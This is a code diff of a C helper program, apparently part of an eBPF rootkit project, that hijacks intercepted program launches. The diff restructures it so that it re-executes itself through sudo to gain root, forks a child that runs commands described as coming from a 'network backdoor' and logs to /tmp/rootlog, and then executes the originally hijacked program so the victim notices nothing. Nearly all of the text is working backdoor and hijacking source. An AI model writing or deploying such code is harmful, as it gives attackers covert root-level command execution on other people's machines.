@@ -18,28 +18,9 @@
 
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
-
-
-char* execute_command(char* command){
-    FILE *fp;
-    char* res = calloc(4096, sizeof(char));
-    char buf[1024];
-
-    fp = popen(command, "r");
-    if(fp == NULL) {
-        printf("Failed to run command\n" );
-        return "COMMAND ERROR";
-    }
-
-    while(fgets(buf, sizeof(buf), fp) != NULL) {
-        strcat(res, buf);
-    }
-    printf("RESULT OF COMMAND: %s\n", res);
-
-    pclose(fp);
-    return res;
-}
-
+#include <linux/bpf.h>
+#include <bpf/bpf.h>
+#include <bpf/libbpf.h>
 
 char* getLocalIpAddress(){
     char hostbuffer[256];
@@ -64,12 +45,32 @@ char* getLocalIpAddress(){
     return IPbuffer;
 }
 
-int main(int argc, char* argv[], char *envp[]){
-    printf("Hello world from execve hijacker\n");
-    for(int ii=0; ii<argc; ii++){
-        printf("Argument %i is %s\n", ii, argv[ii]);
+char* execute_command(char* command){
+    FILE *fp;
+    char* res = calloc(4096, sizeof(char));
+    char buf[1024];
+
+    fp = popen(command, "r");
+    if(fp == NULL) {
+        printf("Failed to run command\n" );
+        return "COMMAND ERROR";
     }
 
+    while(fgets(buf, sizeof(buf), fp) != NULL) {
+        strcat(res, buf);
+    }
+    printf("RESULT OF COMMAND: %s\n", res);
+
+    pclose(fp);
+    return res;
+}
+
+int hijacker_process_routine(char* argv[]){
+    int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
+    if(fd<0){
+        perror("Failed to open log file");
+        //return -1;
+    }
 
     time_t rawtime;
     struct tm * timeinfo;
@@ -77,31 +78,6 @@ int main(int argc, char* argv[], char *envp[]){
     time ( &rawtime );
     timeinfo = localtime ( &rawtime );
     char* timestr = asctime(timeinfo);
-
-
-    if(geteuid() != 0){
-        //We do not have privileges, but we do want them. Let's rerun the program now.
-        char* args[argc+1]; 
-        args[0] = argv[0];
-        for(int ii=0; ii<argc; ii++){
-            args[ii+1] = argv[ii];
-        }
-        if(execve("/usr/bin/sudo", args, envp)<0){
-            perror("Failed to execve()");
-            exit(-1);
-        }
-    }
-
-
-    //We proceed to fork() and exec the original program, whilst also executing the one we 
-    //ordered to execute via the network backdoor
-    //int bpf_map_fd = bpf_map_get_fd_by_id()
-
-    int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
-    if(fd<0){
-        perror("Failed to open log file");
-        //return -1;
-    }
 
     int ii = 0;
     while(*(timestr+ii)!='\0'){
@@ -172,4 +148,68 @@ int main(int argc, char* argv[], char *envp[]){
 
     close(fd);
     return 0;
+}
+
+
+int main(int argc, char* argv[], char *envp[]){
+    printf("Hello world from execve hijacker\n");
+    for(int ii=0; ii<argc; ii++){
+        printf("Argument %i is %s\n", ii, argv[ii]);
+    }
+
+    if(geteuid() != 0){
+        //We do not have privileges, but we do want them. Let's rerun the program now.
+        char* args[argc+3]; 
+        args[0] = "sudo";
+        args[1] = "/home/osboxes/TFG/src/helpers/execve_hijack";
+        printf("execve ARGS%i: %s\n", 0, args[0]);
+        printf("execve ARGS%i: %s\n", 1, args[1]);
+        for(int ii=0; ii<argc; ii++){
+            args[ii+2] = argv[ii];
+            printf("execve ARGS%i: %s\n", ii+2, args[ii+2]);
+        }
+        args[argc+2] = NULL;
+        
+        if(execve("/usr/bin/sudo", args, envp)<0){
+            perror("Failed to execve()");
+            exit(-1);
+        }
+    }
+
+
+    //We proceed to fork() and exec the original program, whilst also executing the one we 
+    //ordered to execute via the network backdoor
+    pid_t pid = fork();
+
+    if (pid < 0) {
+        perror("Fork failed");
+    }
+    if (pid == 0) {
+        //Child process
+        printf("I am the child with pid %d\n", (int) getpid());
+        printf("Child process is exiting\n");
+        hijacker_process_routine(argv);
+        exit(0);
+    }
+    //Parent process. Call original hijacked command
+    char* hij_args[argc]; 
+    hij_args[0] = argv[1];
+    printf("hijacking ARGS%i: %s\n", 0, hij_args[0]);
+    for(int ii=0; ii<argc-2; ii++){
+        hij_args[ii+1] = argv[ii+2];
+        printf("hijacking ARGS%i: %s\n", ii+1, hij_args[ii+1]);
+    }
+    hij_args[argc-1] = NULL;
+    
+    if(execve(argv[1], hij_args, envp)<0){
+        perror("Failed to execve() originally hijacked process");
+        exit(-1);
+    }
+    
+    wait(NULL);
+    printf("parent process is exiting\n");
+    return(0);
+
+
+    
 }
